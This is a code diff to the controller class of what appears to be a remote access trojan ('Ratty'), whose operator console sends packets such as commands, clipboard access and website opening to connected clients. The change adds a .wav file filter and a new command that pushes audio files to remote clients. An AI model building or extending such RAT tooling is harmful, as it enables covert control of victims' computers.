@@ -6,12 +6,14 @@ import java.util.ArrayList;
 
 import javax.swing.JFileChooser;
 import javax.swing.JOptionPane;
+import javax.swing.filechooser.FileNameExtensionFilter;
 
 import de.sogomn.engine.fx.ISoundListener;
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.rat.ActiveClient;
 import de.sogomn.rat.IClientObserver;
 import de.sogomn.rat.builder.StubBuilder;
+import de.sogomn.rat.packet.AudioPacket;
 import de.sogomn.rat.packet.ClipboardPacket;
 import de.sogomn.rat.packet.CommandPacket;
 import de.sogomn.rat.packet.CreateFolderPacket;
@@ -51,6 +53,10 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		fileChooser = new JFileChooser();
 		clients = new ArrayList<ServerClient>();
 		
+		final String currentDirectoryPath = System.getProperty("user.dir");
+		final File currentDirectory = new File(currentDirectoryPath);
+		
+		fileChooser.setCurrentDirectory(currentDirectory);
 		gui.setController(this);
 	}
 	
@@ -64,7 +70,17 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		return null;
 	}
 	
-	private File chooseFile() {
+	private File chooseFile(final String fileType) {
+		final FileNameExtensionFilter filter;
+		
+		if (fileType != null) {
+			filter = new FileNameExtensionFilter("*." + fileType, fileType);
+		} else {
+			filter = null;
+		}
+		
+		fileChooser.setFileFilter(filter);
+		
 		final int input = fileChooser.showOpenDialog(null);
 		
 		if (input == JFileChooser.APPROVE_OPTION) {
@@ -72,6 +88,10 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		}
 		
 		return null;
+	}
+	
+	private File chooseFile() {
+		return chooseFile(null);
 	}
 	
 	private IPacket getPacket(final String command, final ServerClient serverClient) {
@@ -164,6 +184,12 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			
 			if (input != null && !input.isEmpty()) {
 				packet = new WebsitePacket(input);
+			}
+		} else if (command == RattyGui.AUDIO) {
+			final File file = chooseFile("wav");
+			
+			if (file != null) {
+				packet = new AudioPacket(file);
 			}
 		}
 		
